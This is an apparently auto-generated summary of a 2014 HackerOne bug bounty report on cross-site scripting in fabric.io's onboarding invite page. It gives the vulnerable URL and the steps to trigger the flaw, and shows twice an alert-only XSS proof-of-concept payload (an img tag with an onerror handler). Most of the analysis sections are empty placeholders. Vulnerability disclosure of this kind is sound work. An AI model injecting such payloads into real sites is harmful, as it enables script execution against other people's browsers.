# XSS in fabric.io

## Metadata
- **Source:** HackerOne
- **Report:** 32519 | https://hackerone.com/reports/32519
- **Submitted:** 2014-10-22
- **Reporter:** atom
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Proof: http://i.imgur.com/Hk84G3Y.png

Vulnerable Page: https://fabric.io/onboard/invite
Put this code: "><img src=x onerror=alert(document.domain)>
and email
then send invitation


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Proof: http://i.imgur.com/Hk84G3Y.png

Vulnerable Page: https://fabric.io/onboard/invite
Put this code: "><img src=x onerror=alert(document.domain)>
and email
then send invitation


</details>

---
*Analysed by Claude on 2026-05-24*
